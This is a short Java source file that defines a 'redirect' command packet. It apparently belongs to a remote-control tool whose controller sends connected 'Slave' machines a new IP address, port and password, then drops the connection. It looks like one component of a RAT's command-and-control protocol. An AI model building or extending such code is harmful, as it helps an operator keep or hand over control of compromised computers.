package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;

public class Packet75Redirect extends AbstractOutgoingPacket {

	private String ip;
	private int port;
	private String pass;

	public Packet75Redirect(String ip, int port, String pass) {
		this.ip = ip;
		this.port = port;
		this.pass = pass;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(ip);
		dos.writeInt(port);
		slave.writeLine(pass);
		
		slave.closeSocket(new CloseException("Redirecting..."));
	}

	@Override
	public byte getPacketId() {
		return 75;
	}

}
